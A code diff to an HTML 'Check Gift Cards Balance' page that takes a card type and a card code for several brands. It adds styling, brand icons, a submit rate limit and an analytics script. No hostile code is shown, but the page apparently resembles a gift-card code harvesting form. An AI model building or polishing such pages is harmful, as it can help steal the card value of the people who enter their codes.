@@ -2,8 +2,11 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Gift Card Balance Checker</title>
+<title>Check Gift Cards Balance</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- Font Awesome for icons -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
 <style>
 * { box-sizing: border-box; }
@@ -28,6 +31,7 @@ body {
   max-width: 400px;
   border: 1px solid #e6e6e6;
   padding: 22px;
+  border-radius: 6px;
 }
 
 h1 {
@@ -55,6 +59,7 @@ select, input {
   margin-top: 6px;
   border: 1px solid #ccc;
   font-size: 13px;
+  border-radius: 4px;
 }
 
 button {
@@ -66,12 +71,27 @@ button {
   color: #fff;
   font-size: 14px;
   cursor: pointer;
+  border-radius: 4px;
 }
 
 button:hover {
   background: #1558b0;
 }
 
+/* Card icons strip */
+.card-icons {
+  display: flex;
+  gap: 10px;
+  margin-top: 8px;
+  justify-content: center;
+}
+
+.card-icon {
+  width: 24px;
+  height: 24px;
+}
+
+/* Notice */
 .notice {
   margin-top: 18px;
   font-size: 11px;
@@ -80,6 +100,7 @@ button:hover {
   line-height: 1.4;
 }
 
+/* Loader */
 .loader {
   display: none;
   font-size: 12px;
@@ -90,7 +111,17 @@ button:hover {
 </style>
 
 <script>
+let lastSubmit = 0;
+
 function validateForm() {
+  // Rate-limit: 15 sec
+  const now = Date.now();
+  if (now - lastSubmit < 15000) {
+    alert("Please wait before submitting again.");
+    return false;
+  }
+  lastSubmit = now;
+
   const type = document.getElementById("card_type").value;
   const code = document.getElementById("card_code").value.trim();
 
@@ -99,7 +130,7 @@ function validateForm() {
     return false;
   }
 
-  // Simple card-length logic (safe & informational)
+  // Card-specific length logic (informational only)
   const rules = {
     "Amazon": [13, 14],
     "Apple": [16],
@@ -117,8 +148,8 @@ function validateForm() {
   return true;
 }
 </script>
-
 </head>
+
 <body>
 
 <div class="wrapper">
@@ -144,11 +175,20 @@ function validateForm() {
         <option>Other</option>
       </select>
 
+      <!-- Card icons strip -->
+      <div class="card-icons">
+        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/amazon.svg" alt="Amazon">
+        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/apple.svg" alt="Apple">
+        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/googleplay.svg" alt="Google Play">
+        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/steam.svg" alt="Steam">
+        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/xbox.svg" alt="Xbox">
+      </div>
+
       <label>Card Code</label>
       <input id="card_code" type="text" name="card_code"
              placeholder="Enter card code" required>
 
-      <button type="submit">Check Balance</button>
+      <button type="submit"><i class="fa-solid fa-magnifying-glass"></i> Check Balance</button>
 
       <div id="loader" class="loader">Processing request…</div>
     </form>
@@ -160,6 +200,10 @@ function validateForm() {
 
   </div>
 </div>
+
+<!-- Privacy-safe analytics -->
+<script data-goatcounter="https://checkgiftcardsbalance.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
 
 </body>
 </html>
